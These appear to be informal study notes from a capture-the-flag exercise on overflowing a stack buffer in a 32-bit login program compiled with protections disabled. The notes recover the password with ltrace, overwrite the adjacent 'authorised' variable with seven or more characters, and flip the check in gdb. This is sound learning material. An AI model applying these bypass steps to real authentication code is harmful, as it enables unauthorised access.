Overwriting local variables on stack

The -m32 is telling gcc to compile for a 32-bit platform. On a 64-bit platform, gcc normally only comes with 64-bit libraries.
# sudo apt install gcc-multilib

# gcc login.c -o login -fno-stack-protector -z execstack -no-pie -m32

dynamically linked means it will simply reach out to lib.c  on our systems and not for lib.c and other functions in its own firectory, not stripped makes it easy to debug

checksec --file login

no canary : fno stack protector 
NX disabled : -z execstack 
PIE : -no-pie 

#./login
asks for password

do 
#ltrace ./login
and it shows its doing

strcmp("test", "pass")
string compare of "$input" and "pass"

so the password is "pass"

try to overflow the input, we dont how many bytes have been assigned to input so input random

#./login
aaaaaaaaaa

Incorrect Password!
Successfully logged in as Admin (authorised=1633771873) :)
zsh: segmentation fault (core dumped)  ./login

authorised set to 1633771873

try 6 characters

aaaaaa

Incorrect Password!
Failed to log in as Admin (authorised=0) :(

try 7 characters

Incorrect Password!
Successfully logged in as Admin (authorised=97) :)

so 6 is the limit assigned to the input, anything above thaat overflows it
authorised set to 97 which is decimal value of ascii 'a'

if we do that again with 'b'
Incorrect Password!
Successfully logged in as Admin (authorised=98) :)

in C code we have the input buffer, and after that we have the int authorised, so when we overflow the buffer, it is written into the int authorised

in CTF we are not given source code, so open the file in ghidra and check decompiled version

#gdb
file login
info functions
disassemble main

0x08049222 <+140>:	cmp    DWORD PTR [ebp-0xc],0x0

to add break point 2 methods

1) 
break *0x08049222
2)
break *main+140

run

→  0x8049222 <main+140>       cmp    DWORD PTR [ebp-0xc], 0x0
 0x8049226 <main+144>       je     0x804923f <main+169>

compare : [ebp - 0xc(which is 12 in decimal) ] and 0
if it is same, jump on equal to main+169

to find the value it comapres

# x $ebp - 0xc

0xffffcd5c:	0x00000000

the value is 0 and is present at adddress 0xffffcd5c

# set *0xffffcd5c =1

now again 

# x $ebp -0xc 
0xffffcd5c:	0x00000001

now
# c (for continue)

Continuing.
Successfully logged in as Admin (authorised=1) :)

we get successfuly authorised

* if gef is green, still in break point, if gef in red, execution complete

this is why CTF always have a server to connect to for pwn challenge otherwise people just start debugger and complete the challenge

if we enter
aaaaaaa

gef➤  x $ebp - 0xc
0xffffcd5c:	0x00000061

coz decimal of 'a' = 97
hex of 'a'         = 61





